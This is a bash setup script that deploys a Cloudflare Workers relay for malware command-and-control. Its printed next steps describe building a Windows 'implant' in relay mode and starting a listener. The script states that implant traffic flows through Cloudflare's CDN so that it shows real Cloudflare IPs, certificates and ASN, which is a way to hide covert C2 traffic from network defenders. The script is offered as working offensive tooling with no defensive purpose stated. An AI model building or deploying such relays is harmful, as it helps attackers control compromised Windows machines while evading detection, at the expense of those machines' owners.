#!/bin/bash
set -e

R='\033[0;31m'; G='\033[0;32m'; C='\033[0;36m'; Y='\033[1;33m'; N='\033[0m'

DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$DIR"

echo -e "${C}════════════════════════════════════════════════════════${N}"
echo -e "${G}  CDN Relay Setup (Cloudflare Workers)${N}"
echo -e "${C}════════════════════════════════════════════════════════${N}"
echo ""

# ── Step 1: Install wrangler ──
if ! command -v wrangler &>/dev/null && ! npx wrangler --version &>/dev/null 2>&1; then
    echo -e "${C}[*]${N} Installing wrangler..."
    npm install
fi

# ── Step 2: Auth check ──
echo -e "${C}[*]${N} Checking Cloudflare auth..."
echo -e "${Y}[!]${N} If not logged in, run: npx wrangler login"
echo ""

# ── Step 3: Deploy ──
echo -e "${C}[*]${N} Deploying worker..."
npx wrangler deploy 2>&1

WORKER_URL=$(npx wrangler whoami 2>/dev/null | grep -oP 'https://[^\s]+workers\.dev' || true)

echo ""
echo -e "${C}════════════════════════════════════════════════════════${N}"
echo -e "${G}  DEPLOYED${N}"
echo -e "${C}════════════════════════════════════════════════════════${N}"
echo ""
echo -e "  ${Y}Next steps:${N}"
echo ""
echo -e "  1. Note your worker URL from above (e.g. cdn-wss-relay.YOUR.workers.dev)"
echo ""
echo -e "  2. Build implant with relay mode:"
echo -e "     ${G}bash deploy.sh --windows --relay cdn-wss-relay.YOUR.workers.dev${N}"
echo ""
echo -e "  3. Start listener:"
echo -e "     ${G}python3 listener_relay.py${N}"
echo -e "     (edit WORKER_URL in the script first)"
echo ""
echo -e "  ${C}Traffic flow:${N}"
echo -e "  Implant → HTTPS → Cloudflare CDN → Worker → WSS → Listener"
echo -e "  (real CF IP, real CF cert, real CF ASN)"
echo ""
echo -e "${C}════════════════════════════════════════════════════════${N}"
